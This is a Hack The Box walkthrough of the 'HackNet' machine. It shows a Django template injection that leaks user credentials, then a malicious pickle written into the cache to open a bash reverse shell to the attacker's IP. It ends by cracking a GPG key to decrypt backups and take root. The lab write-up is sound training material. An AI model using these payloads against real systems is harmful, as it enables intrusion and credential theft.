---
title: HackNet — HTB
author: Radeel Ahmad
pubDatetime: 2025-09-15T17:58:00Z
tags:
  - hacking
  - HTB
  - SSTI
  - Django
  - pickle
  - GPG
description:
  Hack The Box "HackNet" walkthrough — SSTI in a username field leaking every user's credentials, a Django cache pickle-deserialization RCE as sandy, cracking a GPG-protected SQL backup, and recovering the root password.
---

### HackNet — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**HackNet**'.

![](/blog/images/htb/1*HzExJWOCkx-ZntQKXLuxvg.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ nmap -sV -sC 10.10.11.85
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-15 17:58 UTC
Nmap scan report for 10.10.11.85
Host is up (0.44s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey:
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.87 seconds
```

Update `etc/hosts`:

```
10.10.11.85 hacknet.htb
```

![](/blog/images/htb/1*hrupwK2G9Jn_gPSOvolr_w.png)

Sign Up:

![](/blog/images/htb/1*9QyliIvn4kzvObivrRlGIA.png)

Login:

![](/blog/images/htb/1*rmfqv2ijIzr0rJNVLyNvDQ.png)

We have a File Upload.

![](/blog/images/htb/1*cB1Z4xmOvwwovIzMj1cNgA.png)

#### SSTI

> I found an SSTI (server-side template injection) in the username field: if you set your username to a crafted payload, like a post, then visit `/likes/<id>`, the page will display a list of users along with their passwords.

Set Username:

```
{{users.values}}
```

![](/blog/images/htb/1*9tFZWqeI1t1GEYlOOUCkyQ.png)

When we like a post on the Explore page and hover over our profile picture, the details of all users are revealed (indicating the injected template rendered and exposed user data).

![](/blog/images/htb/1*qshKC7YcJfHiwgSfn3ZoVQ.png)

Checkout you **Sessionid** and **csrftoken.** and like the private post (ID 23).

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ curl -s \
  -b "sessionid=k7y9pz1c123b7qrb31oj2r7uvy5v9tr5; csrftoken=Tu3XcXI6VSwWsJ9iFROpvgioorCc5mB8" \
  -H "Host: hacknet.htb" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "X-CSRFToken: Tu3XcXI6VSwWsJ9iFROpvgioorCc5mB8" \
  "http://hacknet.htb/like/23"

Success
```

Sent an authenticated curl request to increment likes on post 23 at `hacknet.htb`.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ curl -s \
  -b "sessionid=k7y9pz1c123b7qrb31oj2r7uvy5v9tr5; csrftoken=Tu3XcXI6VSwWsJ9iFROpvgioorCc5mB8" \
  -H "Host: hacknet.htb" \
  -H "X-CSRFToken: Tu3XcXI6VSwWsJ9iFROpvgioorCc5mB8" \
  "http://hacknet.htb/likes/23"

<div class="likes-review-item"><a href="/profile/18"><img src="/media/18.jpg" title="backdoor_bandit"></a></div><div class="likes-review-item"><a href="/profile/27"><img src="/media/profile.png" title="&lt;QuerySet [{&#x27;id&#x27;: 18, &#x27;email&#x27;: &#x27;mikey@hacknet.htb&#x27;, &#x27;username&#x27;: &#x27;backdoor_bandit&#x27;, &#x27;password&#x27;: &#x27;mYd4rks1dEisH3re&#x27;, &#x27;picture&#x27;: &#x27;18.jpg&#x27;, &#x27;about&#x27;: &#x27;Specializes in creating and exploiting backdoors in systems. Always leaves a way back in after an attack.&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: False, &#x27;is_hidden&#x27;: False, &#x27;two_fa&#x27;: True}, {&#x27;id&#x27;: 27, &#x27;email&#x27;: &#x27;test@gmail.com&#x27;, &#x27;username&#x27;: &#x27;{{users.values}}&#x27;, &#x27;password&#x27;: &#x27;test&#x27;, &#x27;picture&#x27;: &#x27;profile.png&#x27;, &#x27;about&#x27;: &#x27;&#x27;, &#x27;contact_requests&#x27;: 0, &#x27;unread_messages&#x27;: 0, &#x27;is_public&#x27;: True, &#x27;is_hidden&#x27;: True, &#x27;two_fa&#x27;: False}]&gt;"></a></div>
```

> **Useful information:**
> "email": "mikey@hacknet.htb",
> "username": "backdoor_bandit",
> "password": "mYd4rks1dEisH3re",

Login via SSH as mikey:

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ ssh mikey@10.10.11.85
mikey@10.10.11.85's password:
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Sep 15 15:09:51 2025 from 10.10.14.65
mikey@hacknet:~$ ls
user.txt
mikey@hacknet:~$ cat user.txt
11cc45d37ec25611**********
mikey@hacknet:~$
```

---

### Privilege Escalation:

- Listed all user directories inside `/home`.
- We have User **sandy** also

> We identified that the web application was built with Django. Django supports multiple caching backends such as FileBasedCache, Memcached, and Redis. When no external cache is configured, it defaults to storing cached data on the local filesystem, usually in `/var/tmp/django_cache/`.

The `/var/tmp/django_cache` directory is owned by user sandy and group **www-data**, indicating the Django application runs under **www-data**.

```
mikey@hacknet:~$ ls -ld /var/tmp/django_cache
drwxrwxrwx 2 sandy www-data 4096 Sep 15 15:05 /var/tmp/django_cache
```

Reverse Shell via Python Pickle Deserialization.

**Exploiting Python pickles** — how unpickling untrusted data can lead to remote code execution.

- Start a listener.
- Generate the malicious pickle payload.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$cat payload.py
import pickle, base64, os
class Exploit:
    def __reduce__(self):
        cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.65/4444 0>&1'"
        return (os.system, (cmd,))
print(base64.b64encode(pickle.dumps(Exploit())).decode())
```

Base64-encode:

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ python3 payload.py
gASVTgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDNiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY1LzQ0NDQgMD4mMSeUhZRSlC4=
```

Replace the `.djcache` files with the decoded payload and make them executable:

```
for i in $(ls *.djcache); do rm -f $i; echo 'gASVTgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDNiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY1LzQ0NDQgMD4mMSeUhZRSlC4=' | base64 -d > $i; chmod 777 $i; done
```

```
mikey@hacknet:~$ls -la /var/tmp/django_cache/
total 16
drwxrwxrwx 2 sandy www-data 4096 Sep 17 14:26 .
drwxrwxrwt 4 root  root     4096 Sep 17 14:21 ..
-rw------- 1 sandy www-data   34 Sep 17 14:26 1f0acfe7480a469402f1852f8313db86.djcache
-rw------- 1 sandy www-data 2774 Sep 17 14:26 90dbab8f3b1e54369abdeb4ba1efc106.djcache
mikey@hacknet:~$cd /var/tmp/django_cache/
mikey@hacknet:/var/tmp/django_cache$for i in $(ls *.djcache); do rm -f $i; echo 'gASVTgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDNiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjY1LzQ0NDQgMD4mMSeUhZRSlC4=' | base64 -d > $i; chmod 777 $i; done
```

- Trigger the app to load the cache (browse/like a post) so Django unpickles the file.
- Catch the reverse shell as `sandy`.
- Under `/var/www/HackNet/backups` there are three encrypted SQL backups.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.65] from (UNKNOWN) [10.10.11.85] 49562
bash: cannot set terminal process group (973): Inappropriate ioctl for device
bash: no job control in this shell
sandy@hacknet:/var/www/HackNet$sandy@hacknet:/var/www/HackNet/backups$ls
ls
backup01.sql.gpg
backup02.sql.gpg
backup03.sql.gpg
sandy@hacknet:/var/www/HackNet/backups$
```

Started a simple HTTP server on port 8000 to host files, and downloaded encrypted database backups `backup01.sql.gpg`, `backup02.sql.gpg`, and `backup03.sql.gpg`.

```
wget http://10.129.172.174:8000/backup01.sql.gpg
wget http://10.129.172.174:8000/backup02.sql.gpg
wget http://10.129.172.174:8000/backup03.sql.gpg
```

```
sandy@hacknet:/var/www/HackNet/backups$python3 -m http.server 8000
python3 -m http.server 8000
10.10.14.65 - - [17/Sep/2025 18:32:36] "GET /backup01.sql.gpg HTTP/1.1" 200 -
10.10.14.65 - - [17/Sep/2025 18:32:43] "GET /backup02.sql.gpg HTTP/1.1" 200 -
10.10.14.65 - - [17/Sep/2025 18:33:08] "GET /backup03.sql.gpg HTTP/1.1" 200 -
```

Found GnuPG private keys stored in `/home/sandy/.gnupg/private-keys-v1.d`, and downloaded the GPG public key

```
sandy@hacknet:~/.gnupg/private-keys-v1.d$ ls -la
ls -la
total 20
drwx------ 2 sandy sandy 4096 Sep  5 11:33 .
drwx------ 4 sandy sandy 4096 Sep  5 11:33 ..
-rw------- 1 sandy sandy 1255 Sep  5 11:33 0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key
-rw------- 1 sandy sandy 2088 Sep  5 11:33 armored_key.asc
-rw------- 1 sandy sandy 1255 Sep  5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
sandy@hacknet:~/.gnupg/private-keys-v1.d$
```

- Converted the GPG key armored_key.asc into a crackable hash.
- Cracked the passphrase of the GPG key.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$gpg2john armored_key.asc > hash.txt

File armored_key.asc

┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$cat hash.txt
Sandy:$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293cd490d0f54227788f93637a930a185ab86bc6d4bfd324fdb4f908b41696f71db01b3930cdfbc854a81adf642f5797f94ddf7e67052ded428ee6de69fd4c38f0c6db9fccc6730479b48afde678027d0628f0b9046699033299bc37b0345c51d7fa51f83c3d857b72a1e57a8f38302ead89537b6cb2b88d0a953854ab6b0cdad4af069e69ad0b4e4f0e9b70fc3742306d2ddb255ca07eb101b07d73f69a4bd271e4612c008380ef4d5c3b6fa0a83ab37eb3c88a9240ddeda8238fd202ccc9cf076b6d21602dd2394349950be7de440618bf93bcde73e68afa590a145dc0e1f3c87b74c0e2a96c8fe354868a40ec09dd217b815b310a41449dc5fbdfca513fadd5eeae42b65389aecc628e94b5fb59cce24169c8cd59816681de7b58e5f0d0e5af267bc75a8efe0972ba7e6e3768ec96040488e5c7b2aa0a4eb1047e79372b3605*3*254*2*7*16*db35bd29d9f4006bb6a5e01f58268d96*65011712*850ffb6e35f0058b:::Sandy (My key for backups) <sandy@hacknet.htb>::armored_key.asc

┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetheart       (Sandy)
1g 0:00:00:14 DONE (2025-09-17 18:38) 0.06756g/s 28.64p/s 28.64c/s 28.64C/s gandako..ladybug
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- Imported the GPG key `armored_key.asc` into the local keyring. (Password: sweetheart)
- Decrypted `backup01.sql.gpg` and saved the plaintext output as `backup01.sql`.
- Decrypted `backup02.sql.gpg` and saved the plaintext output as `backup02.sql`.
- Decrypted `backup03.sql.gpg` and saved the plaintext output as `backup03.sql`.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ gpg --import armored_key.asc
gpg: key D72E5C1FA19C12F7: "Sandy (My key for backups) <sandy@hacknet.htb>" not changed
gpg: key D72E5C1FA19C12F7: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ gpg --output backup01.sql --decrypt backup01.sql.gpg
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"

┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ gpg --output backup02.sql --decrypt backup02.sql.gpg
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"

┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ gpg --output backup03.sql --decrypt backup03.sql.gpg
gpg: encrypted with rsa1024 key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
```

Searched `backup02.sql` and grep the keyword password.

![](/blog/images/htb/1*HtO5tdcWVAOjmzg_l2xJXA.png)

> Password: h4ck3rs4re3veRywh3re99

Established an SSH connection to `hacknet.htb` as root.

```
┌──(kali㉿kali)-[~/Desktop/HTB/HackNet]
└─$ ssh root@10.10.11.85
root@10.10.11.85's password:
Linux hacknet 6.1.0-38-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.147-1 (2025-08-02) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 17 14:57:15 2025 from 10.10.14.65
root@hacknet:~# cat /root/root.txt
115462e7d6f*************
root@hacknet:~#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
